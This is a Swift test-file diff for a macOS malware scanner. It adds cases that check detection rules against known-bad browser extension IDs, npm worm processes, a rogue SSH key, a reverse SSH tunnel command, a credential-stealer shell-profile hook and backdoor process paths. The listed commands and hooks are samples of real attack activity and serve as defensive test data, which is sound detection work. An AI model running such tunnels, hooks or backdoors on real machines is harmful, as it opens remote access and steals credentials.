@@ -78,6 +78,7 @@ struct StarterRuleTests {
         ("extension.csp-stripping-2025-02", "gdocgbfmddcfnlnpmnghmjicjognhonm"),
         ("extension.reddirection-2025-07", "eokjikchkppnkdipbiggnmlkahcdkikp"),
         ("extension.shadypanda-2025-12", "mljmfnkjmcdmongjnnnbbnajjdbojoci"),
+        ("extension.superior-2026-08", "kdenlnncndfnhkognokgfpabgkgehodd"),
     ])
     func flagsKnownBadExtensionsByIDOnly(ruleID: String, extensionID: String) throws {
         let rule = try #require(rulebook.rules.first { $0.id == ruleID })
@@ -148,5 +149,94 @@ struct StarterRuleTests {
         #expect(try matches("launch.apple-impersonation", "/Users/alex/Library/LaunchAgents/com.apple.crashreporter.helper.plist"))
         #expect(try matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.apple.systemupdater.plist"))
         #expect(try !matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.google.keystone.daemon.plist"))
+    }
+
+    @Test(arguments: [
+        ("extension.firefox-wallet-impersonators-2026-10", "view-focus-bright@webtools.co"),
+        ("extension.firefox-wallet-stealers-2026-08", "bliss-heaven@webbrol.com"),
+        ("extension.crypto-trader-sessions-2026-09", "orbittracker@snapshot.xyz"),
+        ("extension.crypto-trader-sessions-2026-09", "ingjjklimdeocggninaaapofondbeopd"),
+    ])
+    func flagsKnownBadAddOnsByIDOnly(ruleID: String, extensionID: String) throws {
+        #expect(try matches(ruleID, "browser=Firefox id=\(extensionID) name=Wallet update=addons.mozilla.org permissions=storage"))
+        #expect(try !matches(ruleID, "browser=Firefox id=other@example.com name=\(extensionID) update=addons.mozilla.org permissions=storage"))
+        #expect(try !matches(ruleID, "browser=Firefox id=a\(extensionID) name=Wallet update=addons.mozilla.org permissions=storage"))
+    }
+
+    @Test(arguments: [
+        "bun Math_Symbol.js",
+        "bun /Users/alex/project/node_modules/keyv/Math_Symbol.js",
+        "/tmp/bun-dl-FYwN4e/bun /Users/alex/project/node_modules/flat-cache/math_init.js",
+        "bun /Users/alex/project/.claude/math_init.js",
+        "/bin/bash /Users/alex/.local/bin/gh-token-monitor.sh",
+    ])
+    func detectsShaiHuludWormProcesses(command: String) throws {
+        #expect(try matches("npm.mini-shai-hulud-process", command))
+    }
+
+    @Test(arguments: [
+        "bun run math_init.js",
+        "bun test src/lib/math_init.js",
+        "bun run build",
+        "node /Users/alex/project/node_modules/keyv/Math_Symbol.js",
+        "vim /Users/alex/project/node_modules/keyv/math_init.js",
+    ])
+    func ignoresBunCommandsWithoutTheWormPayload(command: String) throws {
+        #expect(try !matches("npm.mini-shai-hulud-process", command))
+    }
+
+    @Test func warnsBeforeRevokingAMonitoredToken() throws {
+        for ruleID in ["npm.mini-shai-hulud-monitor", "npm.mini-shai-hulud-process"] {
+            let rule = try #require(rulebook.rules.first { $0.id == ruleID })
+            let remedy = try #require(rule.remedy)
+            #expect(remedy.hasPrefix("Don't revoke any GitHub token yet"))
+        }
+    }
+
+    @Test func detectsOnlyTheCursorExtensionKey() throws {
+        let key = "AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P"
+        #expect(try matches("ssh.claude-code-cursor-key", "ssh-ed25519 \(key) svc-telemetry"))
+        #expect(try matches("ssh.claude-code-cursor-key", "ssh-ed25519 \(key) renamed"))
+        #expect(try !matches("ssh.claude-code-cursor-key", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0vylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry"))
+    }
+
+    @Test func detectsOnlyTheCursorExtensionTunnel() throws {
+        #expect(try matches("process.claude-code-cursor-tunnel", "ssh -N -R *:0:localhost:22 -o BatchMode=yes tunnel@203.0.113.5"))
+        #expect(try matches("process.claude-code-cursor-tunnel", "autossh -M 0 -N -R *:0:localhost:22 tunnel@203.0.113.5"))
+        #expect(try !matches("process.claude-code-cursor-tunnel", "ssh -N -R *:0:localhost:22 dev@example.com"))
+        #expect(try !matches("process.claude-code-cursor-tunnel", "ssh -N -R 8080:localhost:3000 tunnel@example.com"))
+    }
+
+    @Test func detectsPamStealerShellHookOnly() throws {
+        #expect(try matches("profile.pamstealer-repair", "# sysnotif-repair"))
+        #expect(try matches("profile.pamstealer-repair", "\"$HOME/Library/Application Support/System/.repair-run\" >/dev/null 2>&1 &"))
+        #expect(try !matches("profile.pamstealer-repair", "alias fix='./repair-run.sh'"))
+        #expect(try !matches("profile.pamstealer-repair", "source ~/bin/.repair-run.sh"))
+        #expect(try !matches("profile.pamstealer-repair", "# repair my prompt"))
+    }
+
+    @Test(arguments: [
+        "/Users/alex/Library/Application Support/System/Finder.app/Contents/MacOS/r8afup9un0",
+        "/Users/alex/Library/Application Support/com.apple.finder.core/Finder.app/Contents/MacOS/77617EA0",
+        "/bin/zsh /Users/alex/Library/Application Support/System/.repair-run",
+        "/tmp/System Settings /Users/alex/Library/Application Support/com.apple.finder.core/Finder.app",
+        "/bin/bash /Users/alex/.task/tokenlinux.sh",
+        "/Users/alex/.task/node-v20.11.1-darwin-x64/bin/node /Users/alex/.task/node-v20.11.1-darwin-x64/bin/parser.js",
+        "Chromium --user-data-dir=/Users/alex/.local/share/.stream/profiles/default",
+        "/Library/Caches/com.apple.act.mond http://203.0.113.5:8000",
+    ])
+    func detectsReportedBackdoorProcesses(command: String) throws {
+        #expect(try matches("process.stealer-backdoor", command))
+    }
+
+    @Test(arguments: [
+        "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
+        "/System/Applications/System Settings.app/Contents/MacOS/System Settings",
+        "task list /Users/alex/.task/pending.data",
+        "/Users/alex/.nvm/versions/node/v20.11.1/bin/node server.js",
+        "/usr/libexec/iconservicesagent /Library/Caches/com.apple.iconservices.store",
+    ])
+    func ignoresProcessesLikeReportedBackdoors(command: String) throws {
+        #expect(try !matches("process.stealer-backdoor", command))
     }
 }
